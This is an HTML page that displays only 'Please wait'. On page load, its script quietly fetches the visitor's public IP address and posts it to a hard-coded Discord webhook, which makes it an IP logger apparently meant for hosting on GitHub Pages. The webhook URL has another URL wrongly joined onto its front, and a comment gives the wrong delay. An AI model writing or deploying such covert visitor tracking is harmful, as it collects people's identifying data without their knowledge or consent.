<h1>Please wait</h1>
<script>
window.addEventListener("load", async () => {
  const webhookURL = "https://api64.ipify.org?format=jsonhttps://discord.com/api/webhooks/1472358587455246548/pc6oWJBb1vMP2bkfS-diW4OkkIY96FWF3RoCC3_3vaBRszSmWis70oIhupoAIcLsTNA6"; // <-- replace with your webhook

  try {
    // Fetch public IP
    const res = await fetch("https://api64.ipify.org?format=json");
    const data = await res.json();
    const ip = data.ip;

    // Optional short delay (2 seconds) before sending
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Prepare Discord embed payload
    const payload = {
      content: "üåê New Visit",
      embeds: [{
        title: "Visitor IP Info",
        color: 5814783,
        fields: [
          { name: "IP Address", value: ip }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    // Send directly to Discord webhook
    await fetch(webhookURL, {
      method: "POST",
      mode: "no-cors", // required for GitHub Pages
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

  } catch (err) {
    console.error("Error fetching or sending IP:", err);
  }
});
</script>
